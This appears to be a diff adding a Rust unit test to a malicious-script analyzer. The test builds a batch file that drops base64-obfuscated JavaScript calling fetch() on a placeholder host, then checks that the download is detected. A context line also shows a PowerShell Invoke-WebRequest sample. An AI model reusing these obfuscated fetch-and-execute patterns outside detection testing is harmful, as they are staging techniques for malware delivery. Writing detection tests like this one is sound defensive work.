@@ -1445,6 +1445,29 @@ sh.Run("powershell -Command Invoke-WebRequest https://direct-js-const.example/p"
     }
 
     #[test]
+    fn call_generated_js_queues_tracked_script_content() {
+        use base64::Engine;
+
+        let js_payload = "fetch('https://implicit-js-b64.example/p')";
+        let encoded = base64::engine::general_purpose::STANDARD.encode(js_payload.as_bytes());
+        let script = format!(
+            "@echo off\r\n\
+             echo eval(atob(\"{encoded}\"));>x.js\r\n\
+             call x.js\r\n"
+        );
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://implicit-js-b64.example/p"
+            )),
+            "generated implicit JS content was not scanned: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn cmd_vd_c_mashed_flag_enables_delayed_expansion() {
         // `cmd /V/D/c "..."` is a single token mashing three flags. The
         // flags-section parser used to bail because the token's 2-char
